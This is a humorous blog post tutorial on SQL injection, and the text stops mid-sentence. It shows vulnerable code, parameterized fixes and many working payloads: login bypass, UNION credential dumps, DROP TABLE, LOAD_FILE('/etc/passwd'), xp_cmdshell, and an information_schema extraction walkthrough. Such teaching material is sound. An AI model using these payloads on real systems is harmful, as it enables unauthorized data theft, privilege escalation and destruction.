
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gríma Wormtongue : A Journey into SQLi | Caspian</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body>
    <header>
        <div class="container">
            <h1>CASPIAN</h1>
            <p class="tagline">// TECH_LOG & DAILY_EXPERIENCES //</p>
        </div>
    </header>
    <main>
        <div class="container">
            <a href="../index.html" class="back-link">← Back to all posts</a>
            <article>
                <div class="post-header">
                    <h1>Gríma Wormtongue : A Journey into SQLi</h1>
                    <div class="post-meta">October 30, 2025</div>
                </div>
                <div class="post-content">
                <h2>1. What is SQL Injection? (Spoiler: It's Not a Medical Procedure)</h2>
    
                <p>
                SQL Injection, or SQLi for those too cool to type full words, is a web security vulnerability 
                that allows attackers to interfere with the queries that an application makes to its database. 
                It's kind of like leaving your front door wide open with a sign that says "Come in and rearrange 
                my furniture!" except the furniture is your customer data.
                </p>
    
                <p>
                In technical terms, SQL injection occurs when user-supplied data is included in SQL queries 
                without proper validation or sanitization. Think of it as inviting a stranger to finish your 
                sentences, except the stranger is a malicious actor and your sentences are database commands.
                </p>
    
                <p>
                OWASP (Open Web Application Security Project) has consistently ranked SQL injection as one of 
                the top security risks. Yes, we're still talking about a vulnerability from the 1990s. 
                Apparently, some developers believe vintage bugs are coming back into fashion.
                </p>

                <h2>2. Intents of SQL Injection (Or: What Could Possibly Go Wrong?)</h2>
    
                <p>
                Why would anyone want to exploit SQL injection? Oh, let me count the ways...</p>

                <h3>Authentication Bypass</h3>
                <p>
                Because logging in with actual credentials is <em>so</em> 2005. With SQL injection, attackers 
                can bypass login forms faster than you can say "forgot password." Who needs a username and 
                password when <code>' OR '1'='1</code> will do just fine?
                </p>

                <h3>Data Exfiltration</h3>
                <p>
                Attackers can retrieve sensitive data from your database credit cards, social security numbers, 
                embarrassing customer reviews. It's like having a complete database dump, except you didn't 
                authorize it and you definitely won't like what they do with it.
                </p>

                <h3>Data Modification</h3>
                <p>
                Why stop at reading data when you can modify it? Change prices, alter records, give yourself 
                admin privileges it's like having god mode, but for your database. Your QA team will <em>love</em> 
                trying to figure out what happened.
                </p>

                <h3>Data Deletion</h3>
                <p>
                For the truly destructive types, there's always <code>DROP TABLE</code>. Because sometimes 
                attackers just want to watch your database burn. Hope you have backups! (You do have backups, 
                right? <em>Right?</em>)
                </p>

                <h3>Remote Code Execution</h3>
                <p>
                In some delightful scenarios, SQL injection can lead to executing arbitrary code on the server. 
                It's the gift that keeps on giving—to the attacker, not to you.
                </p>

                <h2>3. Entry Points of SQL Injection (AKA: Where Developers Get Creative)</h2>
                
                <p>
                SQL injection vulnerabilities can lurk in more places than dust bunnies under your couch. Here are the popular 
                hiding spots:
                </p>

                <h3>User Input Fields</h3>
                <p>
                Login forms, search bars, contact forms—basically anywhere users can type. It turns out that when you trust user 
                input blindly, bad things happen. Who knew?
                </p>
                <pre><code><b>Example 1: Login Form (The Classic)</b>

Vulnerable Code:
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"

Attack:
Username: admin' --
Password: (anything)

Resulting Query:
SELECT * FROM users WHERE username='admin' --' AND password='whatever'

Result: Password check is commented out. Welcome, admin!
    
<b>Example 2: Search Box</b>

Vulnerable Code:
query = "SELECT * FROM products WHERE name LIKE '%" + search + "%'"

Attack:
Search: laptop%' UNION SELECT username,password,email FROM users--

Resulting Query:
SELECT * FROM products WHERE name LIKE '%laptop%' UNION SELECT username,password,email FROM users--%'

Result: Search results now include all usernames and passwords. Oops!
    
<b>Example 3: Contact Form</b>

Vulnerable Code:
query = "INSERT INTO messages (name, email, message) VALUES ('" + name + "', '" + email + "', '" + message + "')"

Attack:
Name: John
Email: test@test.com
Message: Hello'), ('Hacker', 'evil@evil.com', 'I own you

Resulting Query:
INSERT INTO messages (name, email, message) 
VALUES ('John', 'test@test.com', 'Hello'), 
       ('Hacker', 'evil@evil.com', 'I own you')

Result: Injected additional records into the database. Bulk spam anyone?</code></pre>

                <h3>URL Parameters</h3>
                <p>
                Those friendly little parameters in your URL? <code>?id=123</code>? They're not just for bookmarking. They're 
                also perfect for injecting malicious SQL. GET requests have never been so generous!
                </p>
                <pre><code><b>Example 1: Product Page</b>

Vulnerable URL:
https://shop.example.com/product.php?id=5

Vulnerable Code:
query = "SELECT * FROM products WHERE id=" + $_GET['id']

Attack URL:
https://shop.example.com/product.php?id=5 UNION SELECT username,password,email FROM users--

Resulting Query:
SELECT * FROM products WHERE id=5 UNION SELECT username,password,email FROM users--

Result: Product page displays user credentials instead. Surprise!
    
<b>Example 2: Category Filter</b>

Vulnerable URL:
https://blog.example.com/posts.php?category=technology

Vulnerable Code:
query = "SELECT * FROM posts WHERE category='" + $_GET['category'] + "'"

Attack URL:
https://blog.example.com/posts.php?category=technology' OR '1'='1

Resulting Query:
SELECT * FROM posts WHERE category='technology' OR '1'='1'

Result: All posts from all categories are displayed. Bye-bye access control!
    
<b>Example 3: Sorting Parameter</b>

Vulnerable URL:
https://store.example.com/items.php?sort=price

Vulnerable Code:
query = "SELECT * FROM items ORDER BY " + $_GET['sort']

Attack URL:
https://store.example.com/items.php?sort=(SELECT CASE WHEN (1=1) THEN name ELSE price END)

Resulting Query:
SELECT * FROM items ORDER BY (SELECT CASE WHEN (1=1) THEN name ELSE price END)

Result: Conditional sorting used for blind SQL injection. Sneaky!</code></pre>

                <h3>Cookies</h3>
                <p>
                Because why should only visible input be vulnerable? Cookies can be modified by attackers and if your 
                application uses cookie values in SQL queries without validation, congratulations—you've created another 
                attack vector!
                </p>
                <pre><code><b>Example 1: Session Tracking</b>

Vulnerable Code:
user_id = request.cookies.get('user_id')
query = "SELECT * FROM users WHERE id=" + user_id

Normal Cookie:
Cookie: user_id=123

Attack Cookie (modified with browser dev tools):
Cookie: user_id=123 UNION SELECT username,password,null FROM admins--

Resulting Query:
SELECT * FROM users WHERE id=123 UNION SELECT username,password,null FROM admins--

Result: Your session now returns admin credentials. Privilege escalation complete!

<b>Example 2: Language Preference</b>

Vulnerable Code:
lang = request.cookies.get('language')
query = "SELECT content FROM translations WHERE lang='" + lang + "'"

Normal Cookie:
Cookie: language=en

Attack Cookie:
Cookie: language=en' UNION SELECT password FROM users WHERE username='admin'--

Resulting Query:
SELECT content FROM translations WHERE lang='en' UNION SELECT password FROM users WHERE username='admin'--

Result: Page content now displays admin password. I18n = Injection too!</code></pre>

                <h3>HTTP Headers</h3>
                <p>
                User-Agent strings, Referer headers, X-Forwarded-For—if you're logging these directly into a database 
                without sanitization, you're basically putting out a welcome mat for attackers.
                </p>
                <pre><code><b>Example 1: User-Agent Logging</b>

Vulnerable Code:
user_agent = request.headers.get('User-Agent')
query = "INSERT INTO logs (user_agent, ip) VALUES ('" + user_agent + "', '" + ip + "')"

Normal Request:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

Attack Request:
User-Agent: Mozilla', '127.0.0.1'); DROP TABLE logs; --

Resulting Query:
INSERT INTO logs (user_agent, ip) VALUES ('Mozilla', '127.0.0.1'); DROP TABLE logs; --', '192.168.1.1')

Result: Logs table deleted. Your audit trail just vanished!
    
<b>Example 2: X-Forwarded-For IP Logging</b>

Vulnerable Code:
real_ip = request.headers.get('X-Forwarded-For')
query = "INSERT INTO access_logs (ip) VALUES ('" + real_ip + "')"

Normal Request:
X-Forwarded-For: 203.0.113.1

Attack Request:
X-Forwarded-For: 1.1.1.1', (SELECT username FROM users WHERE id=1)); --

Resulting Query:
INSERT INTO access_logs (ip) VALUES ('1.1.1.1', (SELECT username FROM users WHERE id=1)); --')

Result: Access logs now contain extracted user data. Creative data exfiltration!

<b>Example 3: Referer Header Analytics</b>

Vulnerable Code:
referer = request.headers.get('Referer')
query = "UPDATE stats SET views=views+1 WHERE referer='" + referer + "'"

Normal Request:
Referer: https://google.com/search?q=products

Attack Request:
Referer: ' OR 1=1; UPDATE users SET role='admin' WHERE username='attacker'; --

Resulting Query:
UPDATE stats SET views=views+1 WHERE referer='' OR 1=1; UPDATE users SET role='admin' WHERE username='attacker'; --'

Result: All stats incremented AND attacker got admin privileges. Two birds, one query!</code></pre>

                <h3>File Uploads</h3>
                <p>
                Filename metadata can contain SQL injection payloads. That innocent-looking file called 
                <code>cute_cat'; DROP TABLE users--.jpg</code> isn't so innocent after all.
                </p>
                <pre><code><b>Example 1: File Upload with Metadata Storage</b>

Vulnerable Code:
filename = uploaded_file.filename
query = "INSERT INTO files (name, size, uploaded_by) VALUES ('" + filename + "', " + size + ", " + user_id + ")"

Normal Upload:
Filename: vacation_photo.jpg

Attack Upload:
Filename: photo.jpg', 999, 1); UPDATE users SET password='hacked' WHERE id=1; --

Resulting Query:
INSERT INTO files (name, size, uploaded_by) VALUES ('photo.jpg', 999, 1); UPDATE users SET password='hacked' WHERE id=1; --', 12345, 42)

Result: File uploaded AND admin password changed. Multitasking!

<b>Example 2: Image Gallery with Descriptions</b>

Vulnerable Code:
file_desc = request.form.get('description')
filename = uploaded_file.filename
query = "INSERT INTO gallery (filename, description) VALUES ('" + filename + "', '" + file_desc + "')"

Normal Upload:
Filename: sunset.png
Description: Beautiful sunset

Attack Upload:
Filename: sunset.png
Description: Nice pic'), ((SELECT username FROM users WHERE id=1), (SELECT password FROM users WHERE id=1)); --

Resulting Query:
INSERT INTO gallery (filename, description) VALUES ('sunset.png', 'Nice pic'), ((SELECT username FROM users WHERE id=1), (SELECT password FROM users WHERE id=1)); --')

Result: Gallery now contains extracted credentials as "images". Art or theft?</code></pre>

                <h3>Second-Order Injection</h3>
                <p>
                The sophisticated cousin of regular SQL injection. Store malicious input now, execute it later. 
                It's like a time bomb, but for your database. Patience is a virtue, especially for attackers.
                </p>
                <pre><code><b>Example 1: User Registration → Profile Update</b>

Step 1 - Registration (Safe, uses parameterized query):
username: admin'--
password: hashed_password
query = "INSERT INTO users (username, password) VALUES (?, ?)"
Result: Username "admin'--" is safely stored

Step 2 - Profile Update (Vulnerable, uses concatenation):
query = "UPDATE users SET email='" + new_email + "' WHERE username='" + stored_username + "'"

Resulting Query when updating profile:
UPDATE users SET email='newemail@test.com' WHERE username='admin'--'

Result: ALL users get their email updated because everything after admin' is commented out!

<b>Example 2: Comment System</b>

Step 1 - Post Comment (Stored safely):
comment: Just testing'); DROP TABLE posts; --
query = "INSERT INTO comments (user_id, comment) VALUES (?, ?)"
Result: Malicious comment stored in database

Step 2 - Admin Reviews Comments (Vulnerable display):
query = "SELECT * FROM posts WHERE id IN (SELECT post_id FROM comments WHERE comment='" + stored_comment + "')"

Resulting Query:
SELECT * FROM posts WHERE id IN (SELECT post_id FROM comments WHERE comment='Just testing'); DROP TABLE posts; --')

Result: When admin views comments, posts table is deleted. Time-delayed destruction!
    
<b>Example 3: Search History Feature</b>

Step 1 - User Searches (Stored safely):
search_term: ' UNION SELECT username,password FROM users--
query = "INSERT INTO search_history (user_id, term) VALUES (?, ?)"
Result: Search term stored

Step 2 - Display Recent Searches (Vulnerable):
query = "SELECT * FROM products WHERE name LIKE '%" + stored_search_term + "%'"

Resulting Query:
SELECT * FROM products WHERE name LIKE '%' UNION SELECT username,password FROM users--%'

Result: User's search history page now displays all usernames and passwords. "Recently viewed credentials"!</code></pre>

                <h2>4. Simple SQL Injection Examples (Please Don't Try This at Home... Or Do, But Only on Your Own Stuff)</h2>

                <h3>Classic Authentication Bypass</h3>
                <p>Vulnerable query:</p>
                <pre><code>SELECT * FROM users WHERE username='$username' AND password='$password'</code></pre>
                
                <p>Malicious input for username: <code>admin' --</code></p>
                
                <p>Resulting query:</p>
                <pre><code>SELECT * FROM users WHERE username='admin' --' AND password='whatever'</code></pre>
                
                <p>The <code>--</code> comments out the rest of the query. Boom, you're admin now. Who needs passwords?</p>

                <h3>Union-Based Data Extraction</h3>
                <p>Vulnerable query:</p>
                <pre><code>SELECT name, description FROM products WHERE id=$id</code></pre>
                
                <p>Malicious input: <code>1 UNION SELECT username, password FROM users</code></p>
                
                <p>Now you're not just getting product information—you're getting the crown jewels too!</p>

                <h3>Boolean-Based Blind Injection</h3>
                <p>For when the application doesn't show you errors but behaves differently based on true/false conditions:</p>
                <pre><code>1' AND 1=1 -- (page loads normally)
1' AND 1=2 -- (page behaves differently)</code></pre>
                
                <p>It's like playing hot-and-cold with someone's database. Tedious, but effective!</p>

                <h3>Time-Based Blind Injection</h3>
                <p>When even boolean-based blind injection is too obvious:</p>
                <pre><code>1' AND SLEEP(5) --</code></pre>
                
                <p>
                If the page takes 5 seconds to load, congratulations—you've confirmed SQL injection! Now you just 
                need to extract data one bit at a time. See you next year!
                </p>

                <h2>5. Python Cursor Library: A Tale of Two Implementations</h2>
                
                <p>
                Let's talk about Python's database cursor library, where the difference between safe and unsafe code 
                is literally a few characters. Because why make security easy?
                </p>

                <h3>The Unsafe Way (AKA: The "I Like Living Dangerously" Approach)</h3>
                
                <p>Here's how <em>not</em> to do it:</p>
                
                <pre><code>import sqlite3

# Unsafe implementation - String formatting (DON'T DO THIS!)
def get_user_unsafe(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # This is VULNERABLE - user input directly in query
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    cursor.execute(query)
    
    result = cursor.fetchone()
    conn.close()
    return result

# Another unsafe way - f-strings (STILL DON'T DO THIS!)
def get_user_still_unsafe(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # This is ALSO VULNERABLE
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    
    result = cursor.fetchone()
    conn.close()
    return result

# Yet another unsafe way - % formatting (WHY ARE YOU STILL HERE?)
def get_user_why_though(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # VULNERABLE - seeing a pattern yet?
    query = "SELECT * FROM users WHERE username = '%s'" % username
    cursor.execute(query)
    
    result = cursor.fetchone()
    conn.close()
    return result</code></pre>

                <p>
                What's wrong with these? Everything! If someone passes <code>admin' OR '1'='1</code> as 
                the username, congratulations—you just gave them access to your entire user table. Hope they're nice people!</p>

                <h3>The Safe Way (AKA: "I Actually Read the Documentation")</h3>
                
                <p>Here's how to do it properly, using parameterized queries:</p>
                
                <pre><code>import sqlite3

# Safe implementation - Parameterized queries (DO THIS!)
def get_user_safe(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # This is SAFE - using parameter substitution
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    
    result = cursor.fetchone()
    conn.close()
    return result

# For MySQL with mysql.connector
import mysql.connector

def get_user_mysql_safe(username):
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="password",
        database="mydb"
    )
    cursor = conn.cursor()
    
    # Safe with %s placeholder (but only when used correctly!)
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    
    result = cursor.fetchone()
    conn.close()
    return result

# For PostgreSQL with psycopg2
import psycopg2

def get_user_postgres_safe(username):
    conn = psycopg2.connect(
        dbname="mydb",
        user="postgres",
        password="password",
        host="localhost"
    )
    cursor = conn.cursor()
    
    # Safe with %s placeholder
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    
    result = cursor.fetchone()
    conn.close()
    return result</code></pre>

                <p>
                Notice the difference? The safe versions use placeholders (<code>?</code> or <code>%s</code>) 
                and pass the user input as a separate parameter. The database driver handles escaping and 
                quoting automatically. It's almost like the library authors knew what they were doing!
                </p>

                <h2>6. Batch Queries: Because One Vulnerability Isn't Enough</h2>
                
                <p>
                Batch queries, also known as stacked queries, allow executing multiple SQL statements in 
                a single query. It's like an all-you-can-exploit buffet!
                </p>

                <h3>The Problem</h3>
                <p>Some database drivers allow executing multiple statements separated by semicolons:</p>
                <pre><code># Vulnerable to batch query injection
user_id = "1; DROP TABLE users; --"
query = f"SELECT * FROM products WHERE id = {user_id}"
cursor.execute(query)</code></pre>

                <p>This executes:</p>
                <pre><code>SELECT * FROM products WHERE id = 1; DROP TABLE users; --</code></pre>
                
                <p>First you get product data, then your users table takes a vacation. Permanently.</p>

                <h3>The (Partial) Good News</h3>
                <p>
                Not all database drivers support batch queries through standard execute methods. SQLite and PostgreSQL's 
                psycopg2 typically don't allow it in <code>execute()</code>. MySQL's connector does support it 
                if you enable <code>multi=True</code>. Because giving developers the option to shoot themselves in the 
                foot is just good API design, right?
                </p>

                <h3>Prevention</h3>
                <p>
                Use parameterized queries (sensing a theme here?). Even if batch queries are supported, parameterized 
                queries prevent them from being exploited. It's almost like there's a reason everyone keeps recommending 
                them!
                </p>

                <h2>7. Backslash Usage: The Plot Thickens</h2>
                
                <p>Ah, backslashes—the character that just wants to escape. Literally.</p>

                <h3>The Backslash Escape Problem</h3>
                <p>
                In many SQL implementations, backslash is an escape character. This means <code>\'</code> becomes a literal 
                single quote instead of ending a string. Sounds helpful, right? Wrong!
                </p>

                <p>Consider this "sanitization" attempt:</p>
                <pre><code># Terrible idea - manual escaping
username = username.replace("'", "\\'")
query = f"SELECT * FROM users WHERE username = '{username}'"</code></pre>

                <p>Input: <code>admin\</code></p>
                <p>After "sanitization": <code>admin\\</code></p>
                <p>Resulting query: <code>SELECT * FROM users WHERE username = 'admin\\'</code></p>

                <p>The backslash escapes the closing quote, leaving it open. Now append <code> OR 1=1 --</code> and boom—you're in!</p>

                <h3>The Double Backslash Dance</h3>
                <p>
                Some databases (looking at you, MySQL with NO_BACKSLASH_ESCAPES disabled) treat <code>\\</code> as an escape for backslash. 
                This creates delightful scenarios where:
                </p>
                <ul>
                    <li><code>\</code> becomes <code>\\</code></li>
                    <li><code>\\</code> becomes <code>\\\\</code></li>
                    <li>Your sanity becomes <code>NULL</code></li>
                </ul>

                <h3>The Solution (Surprise, Surprise)</h3>
                <p>
                Use parameterized queries! They handle all this escaping nonsense for you. It's almost like security experts have been saying 
                this for decades!
                </p>

                <h2>8. WebApp Interactions with SQL: Choose Your Own Adventure</h2>
                
                <p>Web applications interact with SQL in various delightful ways, each with its own special flavor of vulnerability!</p>

                <h3>Direct Interaction (The "Look Ma, Results!" Approach)</h3>
                
                <p>The application executes a query and displays results directly. Examples:</p>
                <ul>
                    <li>Loading a product page by ID: <code>example.com/product?id=123</code></li>
                    <li>Search results: <code>example.com/search?q=laptop</code></li>
                    <li>User profiles: <code>example.com/user?name=john</code></li>
                </ul>

                <p>
                These are exploitable via UNION-based injection because the results are visible. You can inject your own 
                SELECT statements and see the output. It's like the application is showing you its homework!
                </p>

                <p>Example exploitation:</p>
                <pre><code>example.com/product?id=1 UNION SELECT username,password,email FROM users--</code></pre>

                <p>Now your product page is helpfully displaying user credentials. How convenient!</p>

                <h3>Batched Queries in Direct Interaction</h3>
                <p>
                When the application loads a page and executes multiple queries (like product details + related 
                products + reviews), each query is a potential injection point. It's like having multiple doors 
                and leaving them all unlocked!
                </p>

                <h3>Indirect Interaction (The "Blind Leading the Blind" Approach)</h3>
                
                <p>
                The application executes queries but doesn't display the results directly. Instead, it shows different 
                behavior based on whether the query succeeds or fails. This is Blind SQL Injection territory!
                </p>

                <p>Example: Login form that says "Invalid credentials" vs "Account locked"</p>
                
                <pre><code>username: admin' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')='1'--</code></pre>

                <p>
                If the response changes, the first character of admin's password is 'a'. Only 94 more printable characters to 
                check per position! This is totally an efficient way to spend your time.
                </p>

                <h3>No Result Interaction (The "Watching Paint Dry" Approach)</h3>
                
                <p>The application neither displays results nor shows different behavior. This is where Time-Based Blind SQL Injection comes in!</p>

                <p>The only feedback mechanism is time delay:</p>
                <pre><code>id=1' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--</code></pre>

                <p>If the page takes 5 seconds to load, you guessed correctly! If not, try the next character. At this rate, you'll have the password by next Thursday!</p>

                <p>Time-based blind injection is so slow it makes dial-up internet look fast. But hey, it works!</p>

                <h2>9. Exploitation Flow: It's All About Privilege, Baby</h2>
                
                <p>Not all SQL injections are created equal. What you can do depends on database privileges. Let's explore the hierarchy of database domination!</p>

                <h3>Low Privilege (The "Window Shopping" Level)</h3>
                
                <p>Basic SELECT permissions. You can read data but that's about it.</p>
                
                <p>What you can do:</p>
                <ul>
                    <li>Read data from tables you have access to</li>
                    <li>Extract information schema details</li>
                    <li>Enumerate database structure</li>
                    <li>Steal customer data (you know, the "small" stuff)</li>
                </ul>

                <p>Example:</p>
                <pre><code>SELECT username, password FROM users</code></pre>
                
                <p>It's not much, but you'd be surprised how many companies store passwords in plaintext. Looking at you, Fortune 500 company that shall remain nameless!</p>

                <h3>Medium Privilege (The "Home Renovation" Level)</h3>
                
                <p>SELECT, INSERT, UPDATE permissions. Now we're cooking!</p>
                
                <p>What you can do:</p>
                <ul>
                    <li>Everything from Low Privilege</li>
                    <li>Modify existing data</li>
                    <li>Insert new records</li>
                    <li>Change prices to $0.01</li>
                    <li>Give yourself admin status</li>
                    <li>Create backdoor accounts</li>
                </ul>

                <p>Example:</p>
                <pre><code>1'; UPDATE users SET role='admin' WHERE username='attacker'--</code></pre>
                
                <p>Welcome to the admin panel! Please wipe your feet.</p>

                <h3>High Privilege (The "Demolition Derby" Level)</h3>
                
                <p>SELECT, INSERT, UPDATE, DELETE, DROP permissions. The nuclear option.</p>
                
                <p>What you can do:</p>
                <ul>
                    <li>Everything from Medium Privilege</li>
                    <li>Delete records</li>
                    <li>Drop tables</li>
                    <li>Drop databases</li>
                    <li>Ruin someone's entire week</li>
                </ul>

                <p>Example:</p>
                <pre><code>1'; DROP TABLE users; DROP TABLE products; DROP TABLE everything;--</code></pre>
                
                <p>Also known as "career-limiting moves for the developer who wrote this code."</p>

                <h3>Database Administrator (The "God Mode" Level)</h3>
                
                <p>DBA or root privileges. You're basically the database deity now.</p>
                
                <p>What you can do:</p>
                <ul>
                    <li>Everything from High Privilege</li>
                    <li>Read/write files on the server (MySQL: LOAD_FILE, INTO OUTFILE)</li>
                    <li>Execute operating system commands (SQL Server: xp_cmdshell)</li>
                    <li>Create new users</li>
                    <li>Grant privileges</li>
                    <li>Access other databases</li>
                    <li>Make the sysadmin cry</li>
                </ul>

                <p>Example (MySQL):</p>
                <pre><code>1' UNION SELECT LOAD_FILE('/etc/passwd')--</code></pre>
                
                <p>Reading system files! Because why limit yourself to just the database when you can have the whole server?</p>

                <p>Example (SQL Server):</p>
                <pre><code>'; EXEC xp_cmdshell 'whoami';--</code></pre>
                
                <p>Congratulations, you're now executing arbitrary OS commands. The server is your playground!</p>

                <h3>The Moral of the Story</h3>
                <p>
                Always follow the Principle of Least Privilege. Your web application doesn't need DBA rights to display 
                product pages. If it does, you've made some <em>interesting</em> architectural decisions.
                </p>

                <h2>10. Data Extraction Flow: The Information Schema Treasure Hunt</h2>
                
                <p>So you've found a SQL injection vulnerability. Now what? Time to play database archaeologist!</p>

                <h3>Step 1: Information_Schema - Your New Best Friend</h3>
                
                <p>Most databases have an information_schema database that contains metadata about all databases, tables, and columns. It's like a map to the treasure!</p>

                <p>The information_schema contains tables like:</p>
                <ul>
                    <li><code>SCHEMATA</code> - List of databases</li>
                    <li><code>TABLES</code> - List of all tables</li>
                    <li><code>COLUMNS</code> - List of all columns in all tables</li>
                </ul>

                <p>It's metadata about your data. Meta, right?</p>

                <h3>Step 2: Enumerate Databases</h3>
                
                <p>First, find out what databases exist:</p>
                <pre><code>' UNION SELECT NULL, schema_name FROM information_schema.schemata--</code></pre>

                <p>Results might include:</p>
                <ul> <li>information_schema (system database)</li> <li>mysql (system database)</li> <li>ecommerce (jackpot!)</li> <li>user_data (double jackpot!)</li> </ul>
                <h3>Step 3: Enumerate Tables</h3>
                
                <p>Now find tables in the target database:</p>
                <pre><code>' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='ecommerce'--</code></pre>

                <p>Results might include:</p>
                <ul>
                    <li>users</li>
                    <li>products</li>
                    <li>orders</li>
                    <li>credit_cards (oh hello there!)</li>
                </ul>

                <h3>Step 4: Enumerate Columns</h3>
                
                <p>Find out what juicy data is in those tables:</p>
                <pre><code>' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema='ecommerce' AND table_name='users'--</code></pre>

                <p>Results might include:</p>
                <ul>
                    <li>id</li>
                    <li>username</li>
                    <li>password (plaintext, naturally)</li>
                    <li>email</li>
                    <li>social_security_number (because why not?)</li>
                </ul>

                <h3>Using table_schema to Sort Like a Pro</h3>
                
                <p>Want to organize your ill-gotten data? Use ORDER BY:</p>
                <pre><code>' UNION SELECT table_schema, table_name FROM information_schema.tables ORDER BY table_schema, table_name--</code></pre>

                <p>This groups tables by database and sorts them alphabetically. Because even data thieves appreciate good organization!</p>

                <h3>Step 5: Extract the Actual Data</h3>
                
                <p>Now that you know the structure, extract the goods:</p>
                <pre><code>' UNION SELECT username, password FROM ecommerce.users--</code></pre>

                <p>And there you have it—a complete user database, served up on a silver platter!</p>

                <h3>Pro Tips for Aspiring Database Spelunkers</h3>
                <ul>
                    <li>Use <code>CONCAT()</code> to combine multiple columns into one: <code>CONCAT(username,':',password)</code></li>
                    <li>Use <code>GROUP_CONCAT()</code> (MySQL) to get multiple rows in one result</li>
                    <li>Filter out system databases: <code>WHERE table_schema NOT IN 
                    <br>
                    ('information_schema','mysql','performance_schema')</code></li>
                    <li>Look for interesting table names: users, admin, passwords, secrets, credit_cards, etc.</li>
                </ul>

                <h2>11. UNION-Based Injection: The Art of Query Stitching</h2>
                
                <p>UNION-based injection is the most popular SQL injection technique. It's like copy-pasting someone else's data into your results!</p>

                <h3>UNION Basics (A Quick Refresher)</h3>
                
                <p>The UNION operator combines results from multiple SELECT statements:</p>
                <pre><code>SELECT name, price FROM products
UNION
SELECT username, password FROM users</code></pre>

                <p>This returns products AND users in one result set. Your database is now an all-you-can-eat buffet!</p>

                <h3>UNION Rules (That We'll Exploit)</h3>
                <ol>
                    <li>Both SELECT statements must have the same number of columns</li>
                    <li>Columns must have compatible data types</li>
                    <li>Column order matters</li>
                </ol>

                <h3>Complete Exploitation Flow: From Zero to Database Dump</h3>
                
                <p>
                Let's walk through the entire process step-by-step. This is the methodical approach attackers 
                use to go from "I found a vulnerability" to "I own your database."
                </p>

                <h4>Step 0: Verify SQL Injection Exists</h4>
                
                <p>First, confirm the application is vulnerable. The classic test:</p>
                
                <pre><code>Test 1: id=1     (normal page loads)
Test 2: id=1'    (error or different behavior)
</code></pre>

                <p>If Test 2 behaves differently (error message, blank page, or different content), congratulations—you've found SQL injection! The single quote broke the query syntax.</p>

                <p>Alternative tests:</p>
                <pre><code>Test: id=1 AND 1=1     (page loads normally - condition is true)
Test: id=1 AND 1=2     (page doesn't load or shows error - condition is false)</code></pre>

                <p>If these two tests produce different results, you've confirmed SQL injection. The application is evaluating your conditions, which means it's vulnerable. Time to escalate!</p>

                <h4>Step 1: Determine Number of Columns (ORDER BY Method)</h4>
                
                <p>We're essentially playing "guess the number" with the database. The ORDER BY clause lets us reference columns by their position number.</p>
                
                <pre><code>' ORDER BY 1--   ✓ Success (column 1 exists)
' ORDER BY 2--   ✓ Success (column 2 exists)
' ORDER BY 3--   ✓ Success (column 3 exists)
' ORDER BY 4--   ✗ ERROR! (column 4 doesn't exist)</code></pre>

                <p>When you get an error, you've gone too far! The query has 3 columns. This is like counting ceiling tiles by pointing at them until your finger hits the wall.</p>

                <p>Why does this work? The original query might be:</p>
                <pre><code>SELECT id, name, price FROM products WHERE id='[YOUR INPUT]'</code></pre>
                
                <p>Your injection becomes:</p>
                <pre><code>SELECT id, name, price FROM products WHERE id='' ORDER BY 4--'</code></pre>
                
                <p>Since there's no 4th column, MySQL throws an error. Science!</p>

                <h4>Step 2: Confirm UNION Compatibility (NULL Test)</h4>
                
                <p>Now that we know there are 3 columns, verify UNION works:</p>
                <pre><code>' UNION SELECT NULL, NULL, NULL--</code></pre>

                <p>If this succeeds without errors, UNION injection is possible! NULL is used because it's compatible with any data type. It's the diplomatic peacemaker of SQL values.</p>

                <h4>Step 3: Add Injection to Default Command</h4>
                
                <p>Here's the trick: we need to make the original query return nothing so only our injected data shows. We do this by adding an impossible condition:</p>
                
                <pre><code>Original URL: example.com/product?id=1
Injected URL: example.com/product?id=-1' UNION SELECT NULL, NULL, NULL--</code></pre>

                <p>
                Notice the <code>-1</code>? A negative ID doesn't exist, so the original query returns zero rows. Now only 
                our UNION data appears! It's like clearing the stage before your performance.
                </p>

                <p>Alternative methods to nullify the original query:</p>
                <pre><code>id=999999' UNION SELECT ...    (non-existent ID)
id=1' AND 1=0 UNION SELECT ... (impossible condition)
id=1' AND 0 UNION SELECT ...   (shorthand for AND 1=0)</code></pre>

                <h3>Exploitation Phase: Using UNION to Extract Everything</h3>

                <p>
                Now the fun begins! We'll use UNION to systematically extract the entire database structure and contents. 
                Think of it as digital archaeology, except instead of preserving history, you're stealing it.
                </p>

                <h4>Level 1: Extract Database Name</h4>
                
                <p>First, find out what database we're in. MySQL provides the handy <code>database()</code> function:</p>
                
                <pre><code>Payload: -1' UNION SELECT 1, database(), 3--

Result displayed on page:
Column 1: 1
Column 2: ecommerce_db    ← The database name!
Column 3: 3</code></pre>

                <p>Why use numbers 1 and 3? We're just filling the columns we don't care about. Column 2 contains our treasure—the database name!</p>

                <p>Now we know the database is called <code>ecommerce_db</code>. Let's dig deeper!</p>

                <h4>Level 2: Extract Table Names</h4>
                
                <p>Time to find out what tables exist in this database. We'll query the magical <code>information_schema</code>:</p>
                
                <pre><code>Payload: -1' UNION SELECT 1, group_concat(table_name), 3 
FROM information_schema.tables 
WHERE table_schema='ecommerce_db'--

Result displayed:
users,products,orders,credit_cards,admin_passwords</code></pre>

                <p>
                JACKPOT! Look at those table names! The <code>group_concat()</code> function combines all table names 
